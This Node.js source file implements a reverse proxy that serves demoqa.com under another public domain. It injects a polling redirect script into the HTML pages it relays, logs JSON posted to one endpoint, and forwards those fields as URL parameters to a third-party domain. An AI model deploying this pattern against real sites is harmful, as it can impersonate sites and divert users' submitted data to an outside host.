import http from "node:http";
import https from "node:https";
import crypto from "node:crypto";

const PROXY_HOST = "127.0.0.1";
const PROXY_PORT = 6005;

// Public domain users visit
const PROXY_PUBLIC_DOMAIN = "dashsh.bet";

// Upstream production site
const TARGET_HOSTNAME = "demoqa.com";
const TARGET_PORT = 443;

// Redirect endpoint
const REDIRECT_API_PATH = "/api/v9/test/redirect";

// Destination
const REDIRECT_BASE_URL = "https://test3.marziplus.com";

// Session lifetime
const REDIRECT_TTL_MS = 30_000;

// Per-browser state
const clients = new Map();

/*
|--------------------------------------------------------------------------
| CLIENT SESSION
|--------------------------------------------------------------------------
*/

function createClientId() {
  return crypto.randomUUID();
}

function getClientId(req) {
  const cookieHeader = req.headers.cookie || "";

  const match = cookieHeader.match(
    /(?:^|;\s*)proxy_client_id=([^;]+)/
  );

  return match ? match[1] : null;
}

function getOrCreateClient(req, res) {
  let id = getClientId(req);

  if (!id) {
    id = createClientId();

    res.setHeader(
      "Set-Cookie",
      `proxy_client_id=${id}; Path=/; HttpOnly; SameSite=Lax`
    );
  }

  if (!clients.has(id)) {
    clients.set(id, {
      redirected: false,
      redirectUrl: null,
      createdAt: Date.now()
    });
  }

  return id;
}

/*
|--------------------------------------------------------------------------
| CLEAN EXPIRED SESSIONS
|--------------------------------------------------------------------------
*/

setInterval(() => {
  const now = Date.now();

  for (const [id, state] of clients.entries()) {
    if (now - state.createdAt > REDIRECT_TTL_MS) {
      clients.delete(id);
    }
  }
}, 10_000);

/*
|--------------------------------------------------------------------------
| REDIRECT WATCHER
|--------------------------------------------------------------------------
|
| Injected only into HTML returned by the upstream.
|
*/

function injectWatcher(html) {
  const script = `
<script>
(function () {

  async function checkProxyRedirect() {
    try {
      const response = await fetch(
        "/__proxy_redirect_status",
        {
          method: "GET",
          cache: "no-store",
          credentials: "same-origin"
        }
      );

      if (!response.ok) {
        return;
      }

      const data = await response.json();

      if (data.redirect && data.url) {
        window.location.replace(data.url);
      }

    } catch (error) {
      // Ignore temporary proxy errors.
    }
  }

  setInterval(checkProxyRedirect, 500);

  checkProxyRedirect();

})();
</script>
`;

  if (html.includes("</body>")) {
    return html.replace(
      "</body>",
      `${script}</body>`
    );
  }

  return html + script;
}

/*
|--------------------------------------------------------------------------
| REMOVE HOP-BY-HOP HEADERS
|--------------------------------------------------------------------------
|
| These headers belong to the individual HTTP connection and should not
| be blindly forwarded through the proxy.
|
*/

function removeHopByHopHeaders(headers) {
  const result = { ...headers };

  const connection = result.connection;

  if (connection) {
    const connectionHeaders = connection
      .split(",")
      .map(v => v.trim().toLowerCase());

    for (const header of connectionHeaders) {
      delete result[header];
    }
  }

  delete result.connection;
  delete result["keep-alive"];
  delete result["proxy-authenticate"];
  delete result["proxy-authorization"];
  delete result.te;
  delete result.trailer;
  delete result.upgrade;

  return result;
}

/*
|--------------------------------------------------------------------------
| BUILD UPSTREAM REQUEST HEADERS
|--------------------------------------------------------------------------
*/

function buildUpstreamHeaders(clientReq) {
  const headers = {
    ...clientReq.headers,

    // The upstream must receive its real hostname.
    host: TARGET_HOSTNAME,

    // Prevent compressed HTML because we may inject our watcher.
    "accept-encoding": "identity"
  };

  delete headers.connection;
  delete headers["content-length"];

  return headers;
}

/*
|--------------------------------------------------------------------------
| HTML RESPONSE
|--------------------------------------------------------------------------
*/

function handleHtmlResponse(
  upstreamRes,
  clientRes
) {
  const chunks = [];

  upstreamRes.on("data", chunk => {
    chunks.push(chunk);
  });

  upstreamRes.on("end", () => {
    let body = Buffer.concat(chunks);

    let html = body.toString("utf8");

    html = injectWatcher(html);

    body = Buffer.from(html, "utf8");

    const headers =
      removeHopByHopHeaders(
        upstreamRes.headers
      );

    delete headers["content-length"];
    delete headers["content-encoding"];

    headers["content-length"] = body.length;

    clientRes.writeHead(
      upstreamRes.statusCode || 200,
      headers
    );

    clientRes.end(body);
  });

  upstreamRes.on("error", error => {
    console.error(
      "HTML response error:",
      error.message
    );

    if (!clientRes.headersSent) {
      clientRes.writeHead(502, {
        "Content-Type":
          "text/plain; charset=utf-8"
      });
    }

    clientRes.end("Bad Gateway");
  });
}

/*
|--------------------------------------------------------------------------
| NORMAL UPSTREAM RESPONSE
|--------------------------------------------------------------------------
*/

function handleNormalResponse(
  upstreamRes,
  clientRes
) {
  const headers =
    removeHopByHopHeaders(
      upstreamRes.headers
    );

  clientRes.writeHead(
    upstreamRes.statusCode || 200,
    headers
  );

  upstreamRes.pipe(clientRes);
}

/*
|--------------------------------------------------------------------------
| FORWARD REQUEST TO MARZIPLUS
|--------------------------------------------------------------------------
*/

function forwardRequest(
  clientReq,
  clientRes,
  bufferedBody = null
) {
  const headers =
    buildUpstreamHeaders(clientReq);

  const options = {
    hostname: TARGET_HOSTNAME,
    port: TARGET_PORT,
    method: clientReq.method,
    path: clientReq.url,
    headers,
    rejectUnauthorized: true
  };

  console.log(
    `→ UPSTREAM ${clientReq.method} https://${TARGET_HOSTNAME}${clientReq.url}`
  );

  const upstreamReq = https.request(
    options,
    upstreamRes => {
      console.log(
        `← UPSTREAM ${upstreamRes.statusCode} ${clientReq.method} ${clientReq.url}`
      );

      const contentType =
        upstreamRes.headers["content-type"] || "";

      /*
      |--------------------------------------------------------------------------
      | HTML
      |--------------------------------------------------------------------------
      */

      if (
        contentType
          .toLowerCase()
          .includes("text/html")
      ) {
        handleHtmlResponse(
          upstreamRes,
          clientRes
        );

        return;
      }

      /*
      |--------------------------------------------------------------------------
      | EVERYTHING ELSE
      |--------------------------------------------------------------------------
      */

      handleNormalResponse(
        upstreamRes,
        clientRes
      );
    }
  );

  upstreamReq.on("error", error => {
    console.error(
      "❌ Upstream error:",
      error.message
    );

    if (!clientRes.headersSent) {
      clientRes.writeHead(502, {
        "Content-Type":
          "text/plain; charset=utf-8"
      });
    }

    clientRes.end(
      `Bad Gateway: ${error.message}`
    );
  });

  /*
  |--------------------------------------------------------------------------
  | BUFFERED BODY
  |--------------------------------------------------------------------------
  */

  if (Buffer.isBuffer(bufferedBody)) {
    upstreamReq.setHeader(
      "Content-Length",
      bufferedBody.length
    );

    upstreamReq.end(bufferedBody);

    return;
  }

  /*
  |--------------------------------------------------------------------------
  | NORMAL STREAM
  |--------------------------------------------------------------------------
  */

  clientReq.pipe(upstreamReq);
}

/*
|--------------------------------------------------------------------------
| REDIRECT STATUS
|--------------------------------------------------------------------------
*/

function handleRedirectStatus(
  state,
  clientRes
) {
  const response = JSON.stringify({
    redirect: Boolean(state?.redirected),
    url: state?.redirectUrl || null
  });

  clientRes.writeHead(200, {
    "Content-Type":
      "application/json; charset=utf-8",

    "Cache-Control":
      "no-store, no-cache, must-revalidate",

    "Content-Length":
      Buffer.byteLength(response)
  });

  clientRes.end(response);
}

/*
|--------------------------------------------------------------------------
| REDIRECT TRIGGER
|--------------------------------------------------------------------------
*/

async function handleRedirectRequest(
  clientReq,
  clientRes,
  state
) {
  const chunks = [];

  for await (const chunk of clientReq) {
    chunks.push(chunk);
  }

  const body = Buffer.concat(chunks);

  /*
  |--------------------------------------------------------------------------
  | NO BODY
  |--------------------------------------------------------------------------
  */

  if (body.length === 0) {
    console.log(
      "Redirect endpoint has no body."
    );

    forwardRequest(
      clientReq,
      clientRes,
      body
    );

    return;
  }

  console.log("");
  console.log(
    "=========================================="
  );

  console.log(
    "REDIRECT ENDPOINT"
  );

  console.log(
    `Body size: ${body.length} bytes`
  );

  let json;

  try {
    json = JSON.parse(
      body.toString("utf8")
    );
  } catch (error) {
    console.log(
      "Invalid JSON. Forwarding request."
    );

    console.log(
      "=========================================="
    );

    forwardRequest(
      clientReq,
      clientRes,
      body
    );

    return;
  }

  /*
  |--------------------------------------------------------------------------
  | JSON OBJECT REQUIRED
  |--------------------------------------------------------------------------
  */

  if (
    !json ||
    typeof json !== "object" ||
    Array.isArray(json)
  ) {
    console.log(
      "Request body is not a JSON object."
    );

    forwardRequest(
      clientReq,
      clientRes,
      body
    );

    return;
  }

  console.log(
    "Received JSON:",
    JSON.stringify(json, null, 2)
  );

  /*
  |--------------------------------------------------------------------------
  | BUILD REDIRECT URL
  |--------------------------------------------------------------------------
  |
  | Example:
  |
  | {
  |   "mytestkey": 123
  | }
  |
  | becomes:
  |
  | https://test3.marziplus.com/?mytestkey=123
  |
  */

  const redirectUrl =
    new URL(REDIRECT_BASE_URL);

  for (
    const [key, value]
    of Object.entries(json)
  ) {
    if (
      value !== undefined &&
      value !== null
    ) {
      redirectUrl.searchParams.set(
        key,
        String(value)
      );
    }
  }

  const finalUrl =
    redirectUrl.toString();

  console.log(
    `Redirect URL: ${finalUrl}`
  );

  /*
  |--------------------------------------------------------------------------
  | STORE PER-BROWSER STATE
  |--------------------------------------------------------------------------
  */

  if (state) {
    state.redirected = true;
    state.redirectUrl = finalUrl;
    state.createdAt = Date.now();
  }

  /*
  |--------------------------------------------------------------------------
  | DON'T FORWARD THE REDIRECT REQUEST
  |--------------------------------------------------------------------------
  */

  const response = JSON.stringify({
    success: true,
    proxyRedirect: true
  });

  clientRes.writeHead(200, {
    "Content-Type":
      "application/json; charset=utf-8",

    "Cache-Control":
      "no-store, no-cache, must-revalidate",

    "Content-Length":
      Buffer.byteLength(response)
  });

  clientRes.end(response);

  console.log(
    "Browser session marked for redirect."
  );

  console.log(
    "=========================================="
  );
}

/*
|--------------------------------------------------------------------------
| MAIN HTTP SERVER
|--------------------------------------------------------------------------
*/

const server = http.createServer(
  async (clientReq, clientRes) => {

    try {
      const parsedUrl = new URL(
        clientReq.url,
        `http://${clientReq.headers.host || PROXY_PUBLIC_DOMAIN}`
      );

      const path =
        parsedUrl.pathname;

      /*
      |--------------------------------------------------------------------------
      | SESSION
      |--------------------------------------------------------------------------
      */

      const clientId =
        getOrCreateClient(
          clientReq,
          clientRes
        );

      const state =
        clients.get(clientId);

      console.log(
        `→ ${clientReq.method} ${clientReq.url}`
      );

      /*
      |--------------------------------------------------------------------------
      | REDIRECT STATUS
      |--------------------------------------------------------------------------
      */

      if (
        clientReq.method === "GET" &&
        path ===
          "/__proxy_redirect_status"
      ) {
        handleRedirectStatus(
          state,
          clientRes
        );

        return;
      }

      /*
      |--------------------------------------------------------------------------
      | REDIRECT TRIGGER
      |--------------------------------------------------------------------------
      */

      if (
        path === REDIRECT_API_PATH
      ) {
        await handleRedirectRequest(
          clientReq,
          clientRes,
          state
        );

        return;
      }

      /*
      |--------------------------------------------------------------------------
      | STOP THIS SESSION AFTER REDIRECT
      |--------------------------------------------------------------------------
      */

      if (
        state &&
        state.redirected
      ) {
        console.log(
          `🛑 Session blocked after redirect: ${path}`
        );

        clientRes.writeHead(410, {
          "Content-Type":
            "text/plain; charset=utf-8",

          "Cache-Control":
            "no-store"
        });

        clientRes.end(
          "Proxy session terminated"
        );

        return;
      }

      /*
      |--------------------------------------------------------------------------
      | NORMAL PROXY
      |--------------------------------------------------------------------------
      */

      forwardRequest(
        clientReq,
        clientRes
      );

    } catch (error) {
      console.error(
        "❌ Request handler error:",
        error
      );

      if (!clientRes.headersSent) {
        clientRes.writeHead(500, {
          "Content-Type":
            "text/plain; charset=utf-8"
        });
      }

      clientRes.end(
        "Internal Server Error"
      );
    }
  }
);

/*
|--------------------------------------------------------------------------
| CLIENT ERRORS
|--------------------------------------------------------------------------
*/

server.on(
  "clientError",
  (error, socket) => {
    console.error(
      "Client error:",
      error.message
    );

    socket.end(
      "HTTP/1.1 400 Bad Request\r\n\r\n"
    );
  }
);

/*
|--------------------------------------------------------------------------
| START
|--------------------------------------------------------------------------
*/

server.listen(
  PROXY_PORT,
  PROXY_HOST,
  () => {
    console.log("");
    console.log(
      "=========================================="
    );

    console.log(
      " Vamora Reverse Proxy"
    );

    console.log(
      "=========================================="
    );

    console.log(
      `Public:   https://${PROXY_PUBLIC_DOMAIN}`
    );

    console.log(
      `Local:    http://${PROXY_HOST}:${PROXY_PORT}`
    );

    console.log(
      `Upstream: https://${TARGET_HOSTNAME}`
    );

    console.log(
      `Trigger:  ${REDIRECT_API_PATH}`
    );

    console.log(
      `Redirect: ${REDIRECT_BASE_URL}`
    );

    console.log(
      "=========================================="
    );

    console.log("");
  }
);